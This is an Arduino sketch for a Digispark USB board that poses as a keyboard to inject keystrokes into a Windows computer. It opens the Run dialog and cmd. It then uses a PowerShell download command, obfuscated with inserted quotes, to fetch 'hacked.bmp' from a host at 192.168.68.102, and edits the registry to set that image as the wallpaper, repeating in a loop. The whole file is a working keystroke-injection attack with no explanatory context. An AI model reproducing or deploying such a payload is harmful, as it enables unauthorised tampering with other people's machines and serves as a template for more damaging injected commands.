#include "DigiKeyboard.h"
 
void setup() {
  
}
 
void loop() {
DigiKeyboard.sendKeyStroke(0);
DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
DigiKeyboard.delay(500);
DigiKeyboard.println("cmd");
DigiKeyboard.delay(500);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(500);
DigiKeyboard.println("powershell.exe in'v'oke-WebRequest 'http://192.168.68.102/hacked.bmp' -OutFile 'wallpaper.bmp'");
DigiKeyboard.delay(5000);
DigiKeyboard.println("reg add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v Wallpaper /t REG_SZ /d %USERPROFILE%/wallpaper.bmp /f");
DigiKeyboard.delay(50000);
 
}
